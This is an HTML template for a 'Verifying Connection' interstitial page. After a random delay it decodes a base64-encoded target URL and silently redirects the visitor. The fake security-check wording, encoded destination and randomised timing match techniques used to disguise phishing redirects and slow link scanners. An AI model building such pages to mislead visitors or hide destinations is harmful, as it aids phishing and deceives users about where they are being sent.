<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Securing Session</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            overflow: hidden;
        }
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h2 { margin: 0 0 10px 0; font-weight: 600; letter-spacing: 0.5px; }
        p { margin: 0; font-size: 14px; opacity: 0.8; }
    </style>
</head>
<body>
    <div class="card">
        <div class="loader"></div>
        <h2>Verifying Connection</h2>
        <p>Please wait while we establish a secure route...</p>
    </div>

    <script nonce="{{ nonce }}">
        (function() {
            var _payload = "{{ encoded_target }}";
            
            function _jump() {
                try {
                    var _url = atob(_payload);
                    window.location.replace(_url);
                } catch (e) {
                    console.error("Error");
                }
            }

            var _delay = Math.floor(Math.random() * 800) + 1200;
            setTimeout(_jump, _delay);
        })();
    </script>
</body>
</html>
